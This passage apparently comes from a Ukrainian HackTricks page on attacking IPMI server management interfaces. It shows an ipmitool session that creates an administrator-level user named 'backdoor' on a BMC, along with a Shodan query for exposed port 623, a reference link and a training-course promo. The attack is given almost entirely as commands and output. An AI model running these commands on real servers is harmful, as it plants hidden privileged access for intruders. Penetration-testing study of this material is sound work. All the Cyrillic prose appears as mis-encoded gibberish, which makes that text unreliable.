—Å–∏—Å—Ç–µ–º, –≤–∫–ª—é—á–∞—é—á–∏ Linux, Windows, BSD —Ç–∞ –Ω–∞–≤—ñ—Ç—å DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
